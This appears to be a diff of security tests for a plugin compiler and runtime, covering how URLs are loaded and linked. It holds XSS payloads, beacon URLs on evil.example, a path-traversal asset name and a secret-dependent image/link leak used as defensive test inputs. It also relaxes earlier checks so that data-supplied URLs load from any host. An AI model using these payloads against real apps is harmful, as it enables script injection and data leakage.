@@ -3,10 +3,10 @@
 
 import assert from "node:assert/strict";
 import { describe, test } from "node:test";
-import { compile } from "../src/index.js";
+import { compile, verifyOutput } from "../src/index.js";
 import type { CompileEnv } from "../src/contract.js";
 import { todoEnv } from "./fixtures/env.js";
-import { fakeApp } from "./helpers/host.js";
+import { compileOrThrow, fakeApp } from "./helpers/host.js";
 
 const G = globalThis as Record<string, unknown>;
 
@@ -64,7 +64,7 @@ function assertPlain(v: unknown, depth = 0): void {
   if (typeof v === "object") for (const k of Object.keys(v)) assertPlain((v as Record<string, unknown>)[k], depth + 1);
 }
 
-async function inert(src: string, opts: { budget?: number; renders?: number; addressHosts?: string[]; people?: { id: string; name: string; avatar: string }[] } = {}) {
+async function inert(src: string, opts: { budget?: number; renders?: number; people?: { id: string; name: string; avatar: string }[] } = {}) {
   delete G.__pwned;
   const r = compile({ "plugin.thx": src }, todoEnv());
   if (!r.ok) throw new Error(`expected this to compile, to test the runtime:\n${r.errors.map((e) => `${e.line}:${e.column} ${e.code} ${e.message}`).join("\n")}`);
@@ -302,53 +302,104 @@ describe("coercion and mutation", () => {
 });
 
 describe("handed-in addresses that load", () => {
-  // redteam-language round 2: a `Url` from data (an avatar field) rendered as <img src> was a zero-click GET to any
-  // host, since only the compiler checked addressHosts, and only on literals. The runtime now checks every load.
+  // redteam-language round 2 found that a `Url` from data (an avatar field) rendered as <img src> is a request to any
+  // host. The owner accepts that: the plugin did not make the address, the app's data did. What a plugin can't do is
+  // build one or write one out that loads from outside (L7).
   const people = `${PRE}import { listPeople } from "@app/sdk";\n`;
   const show = (jsx: string) => `${people}export default definePlugin(main, { name: "x" }, function X() {\nconst t = useQuery(listTodos);\nconst p = useQuery(listPeople);\nif (t.data && p.data && p.data.length > 1) { const a = p.data[0].avatar; const b = p.data[1].avatar; const bit = t.data[1].done; return (${jsx}); }\nreturn null;\n});\n`;
-  const others = [{ id: "p2", name: "Ben", avatar: "https://evil.example/beacon?b=1" }];
+  const others = [{ id: "p2", name: "Ben", avatar: "https://elsewhere.example/ben.png" }];
 
-  test("a handed-in Url on a host the app did not list can't be an image", async () => {
-    const { threw, app } = await inert(show(`<img src={a} alt="" />`), { renders: 2, people: others });
-    assert.match(String((threw as Error)?.message), /can't load that address/);
-    assert.equal(app.errors.length > 0 || threw !== undefined, true);
-  });
-  test("choosing between handed-in Urls by a secret can't load either", async () => {
-    const { threw } = await inert(show(`<img src={bit ? b : a} alt="" />`), { renders: 2, people: others });
-    assert.match(String((threw as Error)?.message), /can't load that address/);
-  });
-  test("a handed-in Url on an unlisted host can't be a style's url()", async () => {
-    const viaStyle = await inert(show(`<div style={{ backgroundImage: b }} />`), { renders: 2, people: others });
-    assert.match(String((viaStyle.threw as Error)?.message), /can't load that address/);
-    const viaCss = await inert(show(`<div className={css({ backgroundImage: b })} />`), { renders: 2, people: others });
-    assert.match(String((viaCss.threw as Error)?.message), /can't load that address/);
-    assert.ok(![...viaCss.app.styles.values()].some((r) => r.includes("evil.example")), "no rule names the outside host");
-  });
-  test("a handed-in Url on a listed host loads", async () => {
-    const { threw, app } = await inert(show(`<img src={a} alt="" />`), { renders: 2, people: others, addressHosts: ["avatars.example.com"] });
+  test("a handed-in Url on any host is an image", async () => {
+    const { threw, app } = await inert(show(`<img src={b} alt="" />`), { renders: 2, people: others });
     assert.equal(threw, undefined);
     const [img] = app.render() as { props: Record<string, unknown> }[];
-    assert.equal(img.props.src, "https://avatars.example.com/ana.png");
+    assert.equal(img.props.src, "https://elsewhere.example/ben.png");
   });
-  test("a listed host matches exactly, not as a suffix", async () => {
-    const { threw } = await inert(show(`<img src={a} alt="" />`), { renders: 2, people: others, addressHosts: ["example.com"] });
-    assert.match(String((threw as Error)?.message), /can't load that address/);
+  test("a handed-in Url is a style's url(), in the style prop and in css()", async () => {
+    const viaStyle = await inert(show(`<div style={{ backgroundImage: b }} />`), { renders: 2, people: others });
+    assert.equal(viaStyle.threw, undefined);
+    const viaCss = await inert(show(`<div className={css({ backgroundImage: b })} />`), { renders: 2, people: others });
+    assert.equal(viaCss.threw, undefined);
+    assert.ok([...viaCss.app.styles.values()].some((r) => r.includes('url("https://elsewhere.example/ben.png")')));
   });
-  test("a handed-in Url still works as a link, which waits for a click", async () => {
+  test("a handed-in Url still works as a link", async () => {
     const { threw, app } = await inert(show(`<a href={b}>Ben</a>`), { renders: 2, people: others });
     assert.equal(threw, undefined);
     const [link] = app.render() as { props: Record<string, unknown> }[];
-    assert.equal(link.props.href, "https://evil.example/beacon?b=1");
+    assert.equal(link.props.href, "https://elsewhere.example/ben.png");
   });
-  test("a written-out load holds at run time too, without the compiler's check", async () => {
-    const r = compile({ "plugin.thx": element(`<img src="https://cdn.example.com/logo.png" alt="" />`) }, todoEnv({ addressHosts: ["cdn.example.com"] }));
+  test("the host can't hand a plugin an address that runs code", async () => {
+    for (const bad of ["javascript:alert(1)", "JaVaScRiPt:alert(1)", " javascript:alert(1)", "data:text/html,<script>alert(1)</script>", "vbscript:x", "//evil.example/x.png"]) {
+      const app = await fakeApp(compileOrThrow({ "plugin.thx": element("<p>x</p>") }).code);
+      assert.throws(() => app.rt.url(bad), /is not an address a plugin may be handed/, bad);
+    }
+  });
+});
+
+describe("outside addresses written in the source", () => {
+  const logo = `<img src="https://cdn.example.com/logo.png" alt="" />`;
+  const file = `${"a".repeat(64)}.png`;
+
+  test("an outside load compiles and is listed as a load the build must copy", () => {
+    const r = compile({ "plugin.thx": element(logo) }, todoEnv());
     assert.ok(r.ok);
     if (!r.ok) return;
-    const unlisted = await fakeApp(r.code);
-    assert.throws(() => unlisted.render(), /not allowed here/);
-    const listed = await fakeApp(r.code, { addressHosts: ["cdn.example.com"] });
-    const [img] = listed.render() as { props: Record<string, unknown> }[];
-    assert.equal(img.props.src, "https://cdn.example.com/logo.png");
+    assert.deepEqual(r.manifest.loads, ["https://cdn.example.com/logo.png"]);
+    assert.deepEqual(r.manifest.addresses, ["https://cdn.example.com/logo.png"]);
+    assert.deepEqual(r.manifest.links, []);
+    assert.deepEqual(r.manifest.assets, {});
+  });
+  test("an outside load the build did not copy never loads from outside: the runtime refuses it", async () => {
+    const r = compile({ "plugin.thx": element(logo) }, todoEnv());
+    assert.ok(r.ok);
+    if (!r.ok) return;
+    const app = await fakeApp(r.code, { assetAddress: (f) => `/_thixo/plugins/p/1/assets/${f}` });
+    assert.throws(() => app.render(), /loads https:\/\/cdn\.example\.com\/logo\.png from outside the app/);
+  });
+  test("a copied load renders as a path on the app, and names no outside host", async () => {
+    const r = compile({ "plugin.thx": element(logo) }, todoEnv({ assets: { "https://cdn.example.com/logo.png": file } }));
+    assert.ok(r.ok);
+    if (!r.ok) return;
+    assert.deepEqual(r.manifest.assets, { "https://cdn.example.com/logo.png": file });
+    assert.deepEqual(r.manifest.loads, ["https://cdn.example.com/logo.png"]);
+    assert.doesNotMatch(r.code, /cdn\.example\.com/);
+    assert.deepEqual(verifyOutput(r.code), { ok: true });
+    const app = await fakeApp(r.code, { assetAddress: (f) => `/_thixo/plugins/p/1/assets/${f}?k=t` });
+    const [img] = app.render() as { props: Record<string, unknown> }[];
+    assert.equal(img.props.src, `/_thixo/plugins/p/1/assets/${file}?k=t`);
+  });
+  test("a copied file needs a host that serves it from the app", async () => {
+    const r = compileOrThrow({ "plugin.thx": element(logo) }, todoEnv({ assets: { "https://cdn.example.com/logo.png": file } }));
+    const none = await fakeApp(r.code);
+    assert.throws(() => none.render(), /can't show a plugin's copied files/);
+    const outside = await fakeApp(r.code, { assetAddress: (f) => `https://evil.example/${f}` });
+    assert.throws(() => outside.render(), /served from a path on the app/);
+    const protocolRelative = await fakeApp(r.code, { assetAddress: (f) => `//evil.example/${f}` });
+    assert.throws(() => protocolRelative.render(), /served from a path on the app/);
+  });
+  test("an asset name that is not a content hash is not used", () => {
+    const r = compileOrThrow({ "plugin.thx": element(logo) }, todoEnv({ assets: { "https://cdn.example.com/logo.png": "../../secret.png" } }));
+    assert.deepEqual(r.manifest.assets, {});
+    assert.match(r.code, /rt\.addr\("https:\/\/cdn\.example\.com\/logo\.png", "load"\)/);
+  });
+  test("choosing among written-out images by a secret loads only the app's copies", async () => {
+    const src = `${PRE}export default definePlugin(main, { name: "x" }, function X() {
+  const q = useQuery(listTodos);
+  const secret = q.data && q.data[1] ? q.data[1].done : false;
+  return secret ? <img src="https://evil.example/bit1.png" alt="" /> : <img src="https://evil.example/bit0.png" alt="" />;
+});
+`;
+    const assets = { "https://evil.example/bit0.png": `${"0".repeat(64)}.png`, "https://evil.example/bit1.png": `${"1".repeat(64)}.png` };
+    const r = compileOrThrow({ "plugin.thx": src }, todoEnv({ assets }));
+    assert.deepEqual(r.manifest.loads, ["https://evil.example/bit0.png", "https://evil.example/bit1.png"]);
+    const app = await fakeApp(r.code, { assetAddress: (f) => `/_thixo/assets/${f}` });
+    app.render();
+    await app.flush();
+    const [img] = app.render() as { props: Record<string, unknown> }[];
+    assert.match(String(img.props.src), /^\/_thixo\/assets\/[01]{64}\.png$/);
+  });
+  test("an outside load must be https", () => {
+    refused(element(`<img src="http://cdn.example.com/logo.png" alt="" />`), "thx/address");
   });
 });
 
@@ -365,7 +416,6 @@ describe("elements", () => {
     ["form action", `<form action="https://evil.example"></form>`, "thx/attribute"],
     ["javascript: link", `<a href="javascript:alert(1)">x</a>`, "thx/address"],
     ["data: html image", `<img src="data:text/html,<script>alert(1)</script>" />`, "thx/address"],
-    ["outside image host", `<img src="https://evil.example/x.png" />`, "thx/address"],
     ["srcdoc", `<div srcDoc="<script>alert(1)</script>" />`, "thx/attribute"],
     ["onclick string", `<div onclick="alert(1)" />`, "thx/attribute"],
     ["onClick string", `<div onClick="alert(1)" />`, "thx/attribute"],
@@ -384,22 +434,25 @@ describe("elements", () => {
     ["popover", `<div popover="auto" />`, "thx/attribute"],
     ["target", `<a href="https://example.com" target="_self">x</a>`, "thx/attribute"],
     ["link credentials", `<a href="https://user:pw@example.com">x</a>`, "thx/address"],
-    ["outside link host", `<a href="https://evil.example/bit1">x</a>`, "thx/address"],
-    ["http link to an outside host", `<a href="http://evil.example/">x</a>`, "thx/address"],
+    ["http link", `<a href="http://evil.example/">x</a>`, "thx/address"],
+    ["mailto written out", `<a href="mailto:a@example.com">x</a>`, "thx/address"],
   ];
   for (const [name, jsx, code] of cases) test(name, () => refused(element(jsx), code));
 
-  test("a link written out opens in a new tab with noopener noreferrer, and is in the manifest", async () => {
-    const r = compile({ "plugin.thx": element(`<a href="https://docs.example.com/help">Help</a>`) }, todoEnv({ linkHosts: ["docs.example.com"] }));
+  test("a link written out to any https host opens in a new tab with noopener noreferrer, and is in the manifest", async () => {
+    const r = compile({ "plugin.thx": element(`<a href="https://docs.example.com/help">Help</a>`) }, todoEnv());
     assert.ok(r.ok);
     if (!r.ok) return;
     assert.deepEqual(r.manifest.addresses, ["https://docs.example.com/help"]);
+    assert.deepEqual(r.manifest.links, ["https://docs.example.com/help"]);
+    assert.deepEqual(r.manifest.loads, []);
     const app = await fakeApp(r.code);
     const [a] = app.render() as { type: string; props: Record<string, unknown> }[];
     assert.deepEqual([a.type, a.props.href, a.props.target, a.props.rel], ["a", "https://docs.example.com/help", "_blank", "noopener noreferrer"]);
   });
-  test("a link chosen by secret data among fixed outside addresses is refused", () => {
-    // redteam-exfil round 1: one anchor over N fixed literals on the attacker's host leaked log2(N) bits a click.
+  test("a link chosen by secret data among fixed outside addresses compiles, and the manifest lists every one", () => {
+    // redteam-exfil round 1: one anchor over N fixed literals on the attacker's host tells it log2(N) bits a click.
+    // The owner accepts that for links, which wait for a click; the registry summary says so (see core's tests).
     const src = `${PRE}export default definePlugin(main, { name: "x" }, function X() {
   const q = useQuery(listTodos);
   const secret = q.data && q.data[0] ? q.data[0].done : false;
@@ -407,24 +460,13 @@ describe("elements", () => {
 });
 `;
     const r = compile({ "plugin.thx": src }, todoEnv());
-    assert.equal(r.ok, false);
-    if (!r.ok) {
-      assert.deepEqual([...new Set(r.errors.map((e) => e.code))], ["thx/address"]);
-      assert.match(r.errors[0].message, /evil\.example` is not one of the hosts the app lets plugins link to/);
-    }
-  });
-  test("link hosts and load hosts are separate lists", () => {
-    refused(element(`<a href="https://cdn.example.com/x">x</a>`), "thx/address", todoEnv({ addressHosts: ["cdn.example.com"] }));
-    refused(element(`<img src="https://docs.example.com/x.png" alt="" />`), "thx/address", todoEnv({ linkHosts: ["docs.example.com"] }));
-  });
-  test("a link host matches the host exactly, not a suffix", () => {
-    refused(element(`<a href="https://docs.example.com.evil.example/">x</a>`), "thx/address", todoEnv({ linkHosts: ["docs.example.com"] }));
-    refused(element(`<a href="https://evil.docs.example.com/">x</a>`), "thx/address", todoEnv({ linkHosts: ["docs.example.com"] }));
-  });
-  test("an image from an allowed host compiles and is listed", () => {
-    const r = compile({ "plugin.thx": element(`<img src="https://cdn.example.com/logo.png" alt="" />`) }, todoEnv({ addressHosts: ["cdn.example.com"] }));
     assert.ok(r.ok);
-    if (r.ok) assert.deepEqual(r.manifest.addresses, ["https://cdn.example.com/logo.png"]);
+    if (r.ok) assert.deepEqual(r.manifest.links, ["https://evil.example/bit0", "https://evil.example/bit1"]);
+  });
+  test("a written-out link is never http at run time, without the compiler's check", async () => {
+    const r = compileOrThrow({ "plugin.thx": element(`<a href="https://docs.example.com/help">Help</a>`) });
+    const app = await fakeApp(r.code.replace("https://docs.example.com/help", "http://docs.example.com/help"));
+    assert.throws(() => app.render(), /not allowed here/);
   });
   test("a data: image compiles and is not an outside address", () => {
     const r = compile({ "plugin.thx": element(`<img src="data:image/png;base64,iVBORw0KGgo=" alt="" />`) }, todoEnv());
